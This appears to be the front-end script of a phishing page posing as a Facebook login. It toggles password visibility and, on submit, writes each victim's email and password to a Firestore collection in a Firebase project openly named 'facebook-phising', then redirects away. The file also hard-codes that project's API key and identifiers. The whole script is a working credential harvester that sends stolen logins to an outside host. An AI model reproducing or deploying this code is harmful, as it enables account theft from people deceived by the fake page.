let pass = document.getElementById("pass-ok");
let change_btn = document.getElementById('eye-close')
let change_btn2 = document.getElementById("eye-open")
let em = document.getElementById("em");
let btn = document.getElementById("btn-submit");
is = false
change_btn.addEventListener("click",() => {
	if (!is){
		pass.type = "text";
		is = true;
		change_btn.style.display = "none";
		change_btn2.style.display = "block";
	}else{
		pass.type = "password";
		is = false;
		change_btn.style.display = "block";
		change_btn2.style.display = "none";
	}
})
change_btn2.addEventListener("click",() => {
	if (!is){
		pass.type = "text";
		is = true;
		change_btn.style.display = "none";
		change_btn2.style.display = "block";
	}else{
		pass.type = "password";
		is = false;
		change_btn.style.display = "block";
		change_btn2.style.display = "none";
	}
})

const firebaseConfig = {
    apiKey: "AIzaSyBTG8F_OOl3AZmpkagzSCt7ViF9Aj4MRpo",
    authDomain: "facebook-phising-98eb3.firebaseapp.com",
    projectId: "facebook-phising-98eb3",
    storageBucket: "facebook-phising-98eb3.appspot.com",
    messagingSenderId: "497792850023",
    appId: "1:497792850023:web:3a967f315befc72fc11cc2",
    measurementId: "G-S6YTYYV1KW"
  };

 const app = firebase.initializeApp(firebaseConfig);

 const db = firebase.firestore();
 let users = db.collection("users");

btn.addEventListener("click",() => {
	 users.add({
	    passw: pass.value,
	    email: em.value,
	})
	.then((docRef) => {
	    window.location = "jsdfhsdhfjsdfsh";
	})
})
